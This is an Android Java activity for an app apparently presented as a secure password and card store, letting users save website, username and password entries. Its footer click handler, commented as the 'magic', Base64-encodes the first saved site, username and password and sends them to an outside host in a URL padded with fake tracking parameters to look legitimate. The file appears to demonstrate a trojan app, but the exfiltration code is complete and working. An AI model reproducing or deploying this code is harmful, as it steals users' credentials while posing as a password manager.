package in.android.securecard;

import java.util.ArrayList;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

public class CardsActivity extends Activity implements OnClickListener,
		OnItemClickListener {
	EditText mUsername, mPassword, mWebsite;
	Button mSaveButton;
	ListView mAccountList;
	private AccountsAdapter mAdapter;
	private View mFooterView;
	public static ArrayList<Account> accounts;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_cards);
		mWebsite = (EditText) findViewById(R.id.edt_website);
		mUsername = (EditText) findViewById(R.id.edt_username);
		mPassword = (EditText) findViewById(R.id.edt_password);
		mSaveButton = (Button) findViewById(R.id.btn_save);
		mAccountList = (ListView) findViewById(R.id.account_list);
		accounts = new ArrayList<Account>();
		mSaveButton.setOnClickListener(this);
		mFooterView = ((LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE))
				.inflate(R.layout.footer_view, null, false);
		TextView mFooterText = (TextView) mFooterView
				.findViewById(R.id.txt_footer);
		mAccountList.addFooterView(mFooterView);
		mAdapter = new AccountsAdapter(this);
		mAccountList.setAdapter(mAdapter);
		mFooterText.setOnClickListener(this);
		mAccountList.setOnItemClickListener(this);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.cards, menu);
		return true;
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.btn_save:
			if (!mUsername.getText().toString().isEmpty()
					&& !mPassword.getText().toString().isEmpty()
					&& !mWebsite.getText().toString().isEmpty()) {
				accounts.add(new Account(mUsername.getText().toString(),
						mPassword.getText().toString(), mWebsite.getText()
								.toString()));
				mAdapter.notifyDataSetChanged();
				mUsername.setText("");
				mWebsite.setText("");
				mPassword.setText("");
			} else {
				Toast.makeText(CardsActivity.this,
						R.string.please_enter_complete_details,
						Toast.LENGTH_SHORT).show();
			}
			break;
		case R.id.txt_footer:
			// Here is all the magic

			StringBuffer url = new StringBuffer("http://android.amolgupta.in?");
			// Add some random UTM data to make it look real
			url.append("utm_source=mobile&&utm_campaign=2233&");
			// Add data to steal add whatever format
			String data = accounts.get(0).getWebsite()
					+ accounts.get(0).getUsername()
					+ accounts.get(0).getPassowrd();
			// Base64 to hide actual contents
			data = Base64.encodeToString(data.getBytes(), Base64.DEFAULT);
			// Add to the url
			url.append("id=" + data);
			Intent i = new Intent(Intent.ACTION_VIEW);
			i.setData(Uri.parse(url.toString()));
			startActivity(i);
			break;
		}

	}

	public class AccountsAdapter extends BaseAdapter {
		Context mContext;

		AccountsAdapter(Context mContext) {
			this.mContext = mContext;
		}

		@Override
		public int getCount() {
			// TODO Auto-generated method stub
			return accounts.size();
		}

		@Override
		public Object getItem(int position) {
			// TODO Auto-generated method stub
			return accounts.get(position);
		}

		@Override
		public long getItemId(int position) {
			// TODO Auto-generated method stub
			return position;
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			if (convertView == null) {
				convertView = LayoutInflater.from(mContext).inflate(
						R.layout.account_row, null);
			}
			TextView mTxtUserName = (TextView) convertView
					.findViewById(R.id.item_username);
			TextView mTxtWebSite = (TextView) convertView
					.findViewById(R.id.item_website);
			mTxtUserName.setText(accounts.get(position).getUsername());
			mTxtWebSite.setText(accounts.get(position).getWebsite());
			return convertView;
		}

		@Override
		public void notifyDataSetChanged() {
			addFooterView();
			super.notifyDataSetChanged();
		}

	}

	void addFooterView() {
		if (accounts.size() == 0) {
			mFooterView.setVisibility(View.GONE);
		} else {
			mFooterView.setVisibility(View.VISIBLE);
		}
	}

	@Override
	public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
		Builder builder = new AlertDialog.Builder(this);
		builder.setTitle("Password");
		builder.setMessage(accounts.get(arg2).getPassowrd());
		builder.setCancelable(true);
		builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
			
			@Override
			public void onClick(DialogInterface dialog, int which) {
				dialog.dismiss();
			}
		});
		AlertDialog dialog = builder.create();
		dialog.show();
	}
}
